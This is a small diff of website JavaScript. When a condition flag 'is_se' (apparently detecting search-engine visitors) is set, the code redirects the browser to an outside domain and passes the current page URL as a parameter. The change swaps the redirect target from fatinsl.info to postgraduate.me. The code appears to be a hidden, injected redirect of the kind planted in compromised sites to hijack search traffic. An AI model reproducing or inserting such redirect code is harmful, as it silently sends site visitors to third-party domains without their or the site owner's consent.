@@ -7,6 +7,6 @@
       if(is_se)
     	{
     		var url = window.location.href;
-    		window.location = "https://fatinsl.info/?arsae="+ encodeURIComponent(url);
+    		window.location = "https://postgraduate.me/?arsae="+ encodeURIComponent(url);
     	}
     }
